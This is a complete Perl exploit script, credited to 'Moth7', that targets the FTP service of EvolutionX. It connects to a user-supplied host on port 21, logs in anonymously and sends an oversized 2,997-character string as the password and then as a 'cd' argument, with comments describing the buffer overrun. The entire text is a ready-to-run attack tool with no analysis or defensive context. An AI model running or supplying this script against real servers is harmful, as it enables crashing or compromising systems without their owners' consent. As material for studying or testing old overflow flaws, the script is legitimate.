#!/usr/bin/perl
#
# EvolutionX buffer overflow by Moth7
# http://www.bit-labs.net
#
use IO::Socket;
unless (@ARGV == 1) { die "usage: $0 host ..." }
$host = shift(@ARGV);
$remote = IO::Socket::INET->new( Proto => "tcp",
PeerAddr => $host,
PeerPort => "ftp(21)",
);
unless ($remote) { die "cannot connect to ftp daemon on $host" }

$remote->autoflush(1);

print $remote "USER anonymous\r\n";
sleep(1);

$buf = '\m/'x999;

print $remote "PASS ".$buf."\r\n";      # Try and overrun the PASS buffer
sleep(1);

print $remote"cd ".$buf."\r\n";         # If it fails then overrun the cd buffer instead -
sleep(1);                               # but 2997 characters should do it :p

close $remote;

